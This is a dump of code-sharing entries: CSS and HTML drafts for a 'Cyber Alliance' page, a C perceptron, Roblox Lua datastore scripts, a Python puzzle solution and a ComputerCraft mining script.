id,title,username,language,date,content
RcY49sYx,cyber alliance css draft 19,Anonx0,CSS,Thursday 28th of December 2023 02:24:23 PM CDT,":root {
  --blood: #ef5956;
  --crimson: #d33131;
  --light: #ffffff;
}

html {
  font: 16px/1 system-ui;
  height: 100%;
}

body {
  margin: 0;
  padding: 5rem;
}

header {}

h1 {
  color: var(--crimson);
  font-size: 5rem;
  font-weight: 1000;
  margin: 0 0 2rem;
}

abbr {
  display: inline-block;
  text-decoration: none;
}

p {
  line-height: 1.5;
  margin: 0 0 1rem;
}

span {
  display: inline-block;
}

time {
  display: inline-block;
}

hr {
  background: var(--crimson);
  border: 0;
  height: .2rem;
  margin: 0 0 1rem;
}

main {}

section {}

h2 {
  color: var(--crimson);
  font-size: 2rem;
  font-weight: 1000;
  margin: 0 0 1rem;
}

details {
  border: .2rem solid var(--crimson);
}

summary {
  background: var(--blood);
  color: var(--light);
  cursor: pointer;
  list-style: none;
  padding: 1rem;
}

details[open] summary {
  background: var(--crimson);
}

.detailsBox {
  padding: 1rem;
}

footer {}

@media (min-width: 1000px) {
  html {
    background: var(--blood);
    display: grid;
    justify-content: center;
  }

  body {
    background: var(--light);
    border-left: .2rem solid var(--crimson);
    border-right: .2rem solid var(--crimson);
    box-sizing: border-box;
    width: 1000px;
  }

  header {}

  h1 {}

  abbr {}

  p {}

  span {}

  time {}

  hr {}

  main {}

  section {}

  h2 {}

  details {}

  summary {}

  details[open] summary {}

  .detailsBox {}

  footer {}
}"
iCSgkfha,Basic perceptron,Miquel_Fuster,C,Thursday 28th of December 2023 02:15:12 PM CDT,"#include <stdio.h>
#include <stdlib.h>
#include <time.h>

// the perceptron
typedef struct {
    size_t inputs_count;
    double learning_rate;
    double bias;
    double *weight;
    double (*activation)(double aggregation);
} perceptron;

// a basic activation function
double step_function(double value) {
    return value < 0.5? 0 : 1;
}

// initialization of a perceptron
void perceptron_init(perceptron *p, size_t inputs_count, double learning_rate, double (*activation_function)(double)) {
    srand(time(NULL));

    p->bias = (double)rand() / (double)RAND_MAX; // between 0 and 1
    p->weight = malloc(sizeof(double) * inputs_count);
    p->inputs_count = inputs_count;
    p->learning_rate = learning_rate;
    p->activation = activation_function;

    // basic error handling
    if(p->weight == NULL) {
        p->inputs_count = 0;
        return;
    }

    for(size_t i = 0; i < inputs_count; ++i) {
        p->weight[i] = (double)rand() / (double)RAND_MAX;
    }
}

// activation_function(bias + input[0] * weight[0] + input[1] * weight[1] + ...)
double perceptron_predict(perceptron *p, double inputs[]) {
    double aggregation = p->bias;
    for(size_t i = 0; i < p->inputs_count; ++i) {
        aggregation += inputs[i] * p->weight[i];
    }
    double output = p->activation(aggregation);
    return output;
}

// trains a perceptron with a dataset of inputs and the expected outpus for them
void perceptron_train(perceptron *p, double **inputs, double *expected_outputs, size_t data_count) {
    double y;
    double error;
    size_t row = 0;

    while(row < data_count) {
        y = perceptron_predict(p, inputs[row]);
        error = expected_outputs[row] - y;
        if(error == 0) {
            // if there is no error take the next group of inputs
            ++row;
        } else {
            // if the error is set then recalculate the weights and go to da capo
            p->bias += p->learning_rate * error;
            for(int i = 0; i < p->inputs_count; ++i) {
                p->weight[i] += p->learning_rate * error * inputs[row][i];
            }
            row = 0;
        }
    }
}

// print the internal state of a perceptron
void perceptron_print(perceptron *p) {
    printf(""perceptron %p\n"", p);
    printf("" + learning rate: %lf\n"", p->learning_rate);
    printf("" + bias: %lf\n"", p->bias);
    for(size_t i = 0; i < p->inputs_count; ++i) {
        printf("" + wheight[%u]: %lf\n"", i, p->weight[i]);
    }
}

// frees the 'weight' dynamic array
void perceptron_dispose(perceptron *n) {
    free(n->weight);
}

int main() {
    // dataset for an 'and' gate
    double *inputs[] = {
        (double[]){ 0, 0 },
        (double[]){ 0, 1 },
        (double[]){ 1, 0 },
        (double[]){ 1, 1 }
    };
    double outputs[] = { 0, 0, 0, 1 };

    // creating the perceptron
    perceptron p;
    perceptron_init(&p, 2, 0.1, step_function);
    if(p.inputs_count == 0)
        return EXIT_FAILURE;

    // training the perceptron
    perceptron_train(&p, inputs, outputs, 4);
    perceptron_print(&p);

    // demostration
    for(int k=0; k<4; ++k) {
        double x[] = {(k>>1) & 1, k & 1};
        double s = perceptron_predict(&p, x);

        printf(""%1.0lf y %1.0lf = %1.0lf\n"", x[0], x[1], s);
    }

    // liberation of resources
    perceptron_dispose(&p);
}"
znqa3Xxw,cyber alliance css draft 18,Anonx0,CSS,Thursday 28th of December 2023 12:46:31 PM CDT,":root {
  --blood: #ef5956;
  --crimson: #d33131;
  --light: #ffffff;
}

html {
  font: 16px/1 system-ui;
  height: 100%;
}

body {
  margin: 0;
  padding: 5rem;
}

header {}

h1 {
  color: var(--crimson);
  font-size: 5rem;
  font-weight: 1000;
  margin: 0 0 2rem;
}

abbr {
  display: inline-block;
  text-decoration: none;
}

p {
  line-height: 1.5;
  margin: 0 0 1rem;
}

span {
  display: inline-block;
}

time {
  display: inline-block;
}

hr {
  background: var(--crimson);
  border: 0;
  height: .2rem;
  margin: 0 0 1rem;
}

main {}

section {}

h2 {
  color: var(--crimson);
  font-size: 2rem;
  font-weight: 1000;
  margin: 0 0 1rem;
}

details {}

summary {
  background: var(--blood);
  border: .2rem solid var(--crimson);
  color: var(--light);
  cursor: pointer;
  list-style: none;
  padding: 1rem;
}

details[open] summary {
  background: var(--crimson);
}

.detailsBox {
  border-bottom: .2rem solid var(--crimson);
  border-left: .2rem solid var(--crimson);
  border-right: .2rem solid var(--crimson);
  padding: 1rem;
}

footer {}

@media (min-width: 1000px) {
  html {
    background: var(--blood);
    display: grid;
    justify-content: center;
  }

  body {
    background: var(--light);
    border-left: .2rem solid var(--crimson);
    border-right: .2rem solid var(--crimson);
    box-sizing: border-box;
    width: 1000px;
  }

  header {}

  h1 {}

  abbr {}

  p {}

  span {}

  time {}

  hr {}

  main {}

  section {}

  h2 {}

  details {}

  summary {}

  details[open] summary {}

  .detailsBox {}

  footer {}
}"
BxfP3iar,cyber alliance css draft 17,Anonx0,CSS,Thursday 28th of December 2023 12:33:33 PM CDT,":root {
  --blood: #ef5956;
  --crimson: #d33131;
  --light: #ffffff;
}

html {
  font: 16px/1 system-ui;
  height: 100%;
}

body {
  margin: 0;
  padding: 5rem;
}

header {}

h1 {
  color: var(--crimson);
  font-size: 5rem;
  font-weight: 1000;
  margin: 0 0 2rem;
}

abbr {
  display: inline-block;
  text-decoration: none;
}

p {
  line-height: 1.5;
  margin: 0 0 1rem;
}

span {
  display: inline-block;
}

time {
  display: inline-block;
}

hr {
  background: var(--crimson);
  border: 0;
  height: .2rem;
  margin: 0 0 1rem;
}

main {}

section {}

h2 {
  color: var(--crimson);
  font-size: 2rem;
  font-weight: 1000;
  margin: 0 0 1rem;
}

details {}

summary {
  background: var(--blood);
  border: .2rem solid var(--crimson);
  color: var(--light);
  cursor: pointer;
  padding: 1rem;
}

details[open] summary {
  background: var(--crimson);
}

.detailsBox {
  border-bottom: .2rem solid var(--crimson);
  border-left: .2rem solid var(--crimson);
  border-right: .2rem solid var(--crimson);
  padding: 1rem;
}

footer {}

@media (min-width: 1000px) {
  html {
    background: var(--blood);
    display: grid;
    justify-content: center;
  }

  body {
    background: var(--light);
    border-left: .2rem solid var(--crimson);
    border-right: .2rem solid var(--crimson);
    box-sizing: border-box;
    width: 1000px;
  }

  header {}

  h1 {}

  abbr {}

  p {}

  span {}

  time {}

  hr {}

  main {}

  section {}

  h2 {}

  details {}

  summary {}

  details[open] summary {}

  .detailsBox {}

  footer {}
}"
djmz9jH8,cyber alliance draft 10,Anonx0,HTML 5,Thursday 28th of December 2023 12:25:40 PM CDT,"<!doctype html>
<html lang=""es"">
  <head>
    <meta charset=""utf-8"">
    <link href=""main.css"" rel=""stylesheet"">
    <title></title>
  </head>
  <body>
    <header>
      <h1>
        <abbr lang=""en"" title=""HyperText Markup Language"">HTML</abbr>
      </h1>
      <p>Estándar bifurcado por <span lang=""en"">Cyber Alliance</span>. Última revisión: <time datetime=""1704067200"">1 de enero de 2024</time>.</p>
    </header>
    <hr>
    <main>
      <section data-ref=""alpha-0"">
        <h2>Sumario</h2>
        <details>
          <summary>Capítulos</summary>
          <div class=""detailsBox""></div>
        </details>
      </section>
    </main>
    <footer></footer>
  </body>
</html>"
xrxXfhhU,cyber alliance css draft 16,Anonx0,CSS,Thursday 28th of December 2023 12:23:33 PM CDT,":root {
  --blood: #ef5956;
  --crimson: #d33131;
  --light: #ffffff;
}

html {
  font: 16px/1 system-ui;
  height: 100%;
}

body {
  margin: 0;
  padding: 5rem;
}

header {}

h1 {
  color: var(--crimson);
  font-size: 5rem;
  font-weight: 1000;
  margin: 0 0 2rem;
}

abbr {
  display: inline-block;
  text-decoration: none;
}

p {
  line-height: 1.5;
  margin: 0 0 1rem;
}

span {
  display: inline-block;
}

time {
  display: inline-block;
}

hr {
  background: var(--crimson);
  border: 0;
  height: .2rem;
  margin: 0 0 1rem;
}

main {}

section {}

h2 {
  color: var(--crimson);
  font-size: 2rem;
  font-weight: 1000;
  margin: 0 0 1rem;
}

details {}

summary {
  background: var(--blood);
  border: .2rem solid var(--crimson);
  color: var(--light);
  cursor: pointer;
  list-style-type: '> ';
  padding: 1rem;
}

details[open] summary {
  list-style-type: 'v ';
}

.detailsBox {
  border-bottom: .2rem solid var(--crimson);
  border-left: .2rem solid var(--crimson);
  border-right: .2rem solid var(--crimson);
  padding: 1rem;
}

footer {}

@media (min-width: 1000px) {
  html {
    background: var(--blood);
    display: grid;
    justify-content: center;
  }

  body {
    background: var(--light);
    border-left: .2rem solid var(--crimson);
    border-right: .2rem solid var(--crimson);
    box-sizing: border-box;
    width: 1000px;
  }

  header {}

  h1 {}

  abbr {}

  p {}

  span {}

  time {}

  hr {}

  main {}

  section {}

  h2 {}

  details {}

  summary {}

  details[open] summary {}

  .detailsBox {}

  footer {}
}"
w7dCrXE9,New Story Game DataStore (Main),Sungmingamerpro13,CSS,Thursday 28th of December 2023 12:00:10 PM CDT,"local TeleportService = game:GetService(""TeleportService"")
local AddRoundsDataStore = game:GetService(""DataStoreService""):GetDataStore(""AddRounds"")
local AddWinsDataStore = game:GetService(""DataStoreService""):GetDataStore(""AddWins"")
local CoinsDataStore = game:GetService(""DataStoreService""):GetDataStore(""Coins"")
local LevelsDataStore = game:GetService(""DataStoreService""):GetDataStore(""Level"")
local ExpDataStore = game:GetService(""DataStoreService""):GetDataStore(""Exp"")

local VIPGamepass = (267214996)

game.Players.PlayerAdded:Connect(function(player)

	local Folder = Instance.new(""Folder"", player)
	Folder.Name = ""leaderstats""

	local AddRounds = Instance.new(""NumberValue"", player)
	AddRounds.Name = ""AddRounds""
	AddRounds.Value = AddRoundsDataStore:GetAsync(player.UserId) or 0

	local AddWins = Instance.new(""NumberValue"", player)
	AddWins.Name = ""AddWins""
	AddWins.Value = AddWinsDataStore:GetAsync(player.UserId) or 0

	local Coins = Instance.new(""NumberValue"", player)
	Coins.Name = ""Coins""
	Coins.Value = CoinsDataStore:GetAsync(player.UserId) or 0

	local Levels = Instance.new(""NumberValue"", Folder)
	Levels.Name = ""Levels""
	Levels.Value = LevelsDataStore:GetAsync(player.UserId) or 1

	local Exp = Instance.new(""NumberValue"", Folder)
	Exp.Name = ""Exp""
	Exp.Value = ExpDataStore:GetAsync(player.UserId) or 0

	while wait() do
		if Exp.Value >= (100 * (Levels.Value + 1)) then
			Levels.Value = Levels.Value + 1
			Exp.Value = 0
		end
	end

	if game:GetService(""MarketplaceService""):UserOwnsGamePassAsync(player.UserId, VIPGamepass) then
		player.Coins.Value = player.Coins.Value * 2
	end

end)

game.Players.PlayerRemoving:Connect(function(player)
	AddRoundsDataStore:SetAsync(player.UserId, player.AddRounds.Value)
	AddWinsDataStore:SetAsync(player.UserId, player.AddWins.Value)
	CoinsDataStore:SetAsync(player.UserId, player.Coins.Value)
	LevelsDataStore:SetAsync(player.UserId, player.leaderstats.Levels.Value)
	ExpDataStore:SetAsync(player.UserId, player.leaderstats.Exp.Value)
end)

game:BindToClose(function()
	print(""STOPPED!"")

	for i,player in pairs(game.Players:GetPlayers()) do
		AddRoundsDataStore:SetAsync(player.UserId, player.AddRounds.Value)
		AddWinsDataStore:SetAsync(player.UserId, player.AddWins.Value)
		CoinsDataStore:SetAsync(player.UserId, player.Coins.Value)
		LevelsDataStore:SetAsync(player.UserId, player.leaderstats.Levels.Value)
		ExpDataStore:SetAsync(player.UserId, player.leaderstats.Exp.Value)
		print(""Saved data for ""..player.Name)
	end
end)

"
SYdkHtcr,New Story Game DataStore + Money Update (Main),Sungmingamerpro13,CSS,Thursday 28th of December 2023 11:58:16 AM CDT,"local TeleportService = game:GetService(""TeleportService"")
local AddRoundsDataStore = game:GetService(""DataStoreService""):GetDataStore(""AddRounds"")
local AddWinsDataStore = game:GetService(""DataStoreService""):GetDataStore(""AddWins"")
local CoinsDataStore = game:GetService(""DataStoreService""):GetDataStore(""Coins"")
local LevelsDataStore = game:GetService(""DataStoreService""):GetDataStore(""Level"")
local ExpDataStore = game:GetService(""DataStoreService""):GetDataStore(""Exp"")
local MoneyDataStore = game:GetService(""DataStoreService""):GetDataStore(""Money"")

local VIPGamepass = (267214996)

game.Players.PlayerAdded:Connect(function(player)

	local Folder = Instance.new(""Folder"", player)
	Folder.Name = ""leaderstats""

	local AddRounds = Instance.new(""NumberValue"", player)
	AddRounds.Name = ""AddRounds""
	AddRounds.Value = AddRoundsDataStore:GetAsync(player.UserId) or 0

	local AddWins = Instance.new(""NumberValue"", player)
	AddWins.Name = ""AddWins""
	AddWins.Value = AddWinsDataStore:GetAsync(player.UserId) or 0

	local Coins = Instance.new(""NumberValue"", player)
	Coins.Name = ""Coins""
	Coins.Value = CoinsDataStore:GetAsync(player.UserId) or 0

	local Levels = Instance.new(""NumberValue"", Folder)
	Levels.Name = ""Levels""
	Levels.Value = LevelsDataStore:GetAsync(player.UserId) or 1

	local Exp = Instance.new(""NumberValue"", Folder)
	Exp.Name = ""Exp""
	Exp.Value = ExpDataStore:GetAsync(player.UserId) or 0
	
	local Money = Instance.new(""NumberValue"", player)
	Money.Name = ""Money""
	Money.Value = MoneyDataStore:GetAsync(player.UserId) or 0

	while wait() do
		if Exp.Value >= (100 * (Levels.Value + 1)) then
			Levels.Value = Levels.Value + 1
			Exp.Value = 0
		end
	end

	if game:GetService(""MarketplaceService""):UserOwnsGamePassAsync(player.UserId, VIPGamepass) then
		player.Coins.Value = player.Coins.Value * 2
	end

end)

game.Players.PlayerRemoving:Connect(function(player)
	AddRoundsDataStore:SetAsync(player.UserId, player.AddRounds.Value)
	AddWinsDataStore:SetAsync(player.UserId, player.AddWins.Value)
	CoinsDataStore:SetAsync(player.UserId, player.Coins.Value)
	LevelsDataStore:SetAsync(player.UserId, player.leaderstats.Levels.Value)
	ExpDataStore:SetAsync(player.UserId, player.leaderstats.Exp.Value)
	MoneyDataStore:SetAsync(player.UserId, player.Money.Value)
end)

game:BindToClose(function()
	print(""STOPPED!"")

	for i,player in pairs(game.Players:GetPlayers()) do
		AddRoundsDataStore:SetAsync(player.UserId, player.AddRounds.Value)
		AddWinsDataStore:SetAsync(player.UserId, player.AddWins.Value)
		CoinsDataStore:SetAsync(player.UserId, player.Coins.Value)
		LevelsDataStore:SetAsync(player.UserId, player.leaderstats.Levels.Value)
		ExpDataStore:SetAsync(player.UserId, player.leaderstats.Exp.Value)
		MoneyDataStore:SetAsync(player.UserId, player.Money.Value)
		print(""Saved data for ""..player.Name)
	end
end)

"
6nWy7fhT,5 из статграда,DaniDori,Python,Thursday 28th of December 2023 11:56:58 AM CDT,"arr = [0]*10000
for i in range(1, 100):
    s = bin(i)[2:]
    s += bin(i % 4)[2:]
    n = int(s, 2)
    arr[n] = 1
maxi = 0
# for i in range(10000):
#     maxi = max(maxi, arr[i:i+49].count(1))
maxi = max(arr[i:i+49].count(1) for i in range(10000))
print(maxi)"
Jg1m4JEW,rednet mine,dataclear,Lua,Thursday 28th of December 2023 11:45:46 AM CDT,"peripheral.find(""modem"", rednet.open)

-- constants
pusherSide = ""left""
pullerSide = ""right""
mineSide = ""back""
mineSeconds = 5
 
rs.setOutput(pusherSide, false)
rs.setOutput(pullerSide, false)
rs.setOutput(mineSide, false)


function pulseRS(side)

    rs.setOutput(side, true)
    sleep(1)
    rs.setOutput(side, false)

end


function runMining()

    rs.setOutput(mineSide, true)
    sleep(mineSeconds)
    rs.setOutput(mineSide, true)

end


function getMineStatus()

    print(""running getMineStatus..."")
 
    local id, message = rednet.receive()
    
    print(""got message: "" .. message)
    
    return message == ""MINE""
    

end


function mineStrip()

    runMining()
    pulseRS(pullerSide)
    sleep(0.5)
    pulseRS(pusherSide)

end

while true
do

    if getMineStatus() == true then
        print(""Mining one strip"")
        mineStrip()
    end
    sleep(2)

 end"
